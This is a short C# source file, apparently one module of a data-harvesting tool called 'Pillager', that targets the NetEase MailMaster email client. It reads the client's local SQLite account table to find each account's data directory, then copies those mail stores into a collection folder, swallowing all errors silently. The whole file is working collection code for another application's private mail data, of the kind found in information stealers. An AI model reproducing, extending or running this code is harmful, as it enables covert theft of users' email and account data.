using Pillager.Helper;
using System;
using System.Collections.Generic;
using System.IO;

namespace Pillager.Mails
{
    internal class MailMaster : ICommand
    {
        private List<string> GetDataPath()
        {
            List<string> strings = new List<string>();
            string sqlpath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Netease\\MailMaster\\data\\app.db");
            if (!File.Exists(sqlpath)) return strings;
            string db_tempFile = Path.GetTempFileName();
            try
            {
                File.Copy(sqlpath, db_tempFile, true);
                SQLiteHandler handler = new SQLiteHandler(db_tempFile);
                if (!handler.ReadTable("Account")) return strings;
                for (int i = 0; i < handler.GetRowCount(); i++)
                {
                    string path = handler.GetValue(i, "DataPath");
                    strings.Add(path);
                }
            }
            catch { }
            File.Delete(db_tempFile);
            return strings;
        }

        public override void Save(string path)
        {
            try
            {
                string sqlpath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Netease\\MailMaster\\data");
                if (!Directory.Exists(sqlpath)) return;
                List<string> datapath = GetDataPath();
                string savepath = Path.Combine(path, "MailMaster");
                Directory.CreateDirectory(savepath);
                foreach (var directory in datapath)
                {
                    Methods.CopyDirectory(directory, Path.Combine(savepath, Path.GetFileName(directory)), true);
                }
            }
            catch { }
        }
    }
}
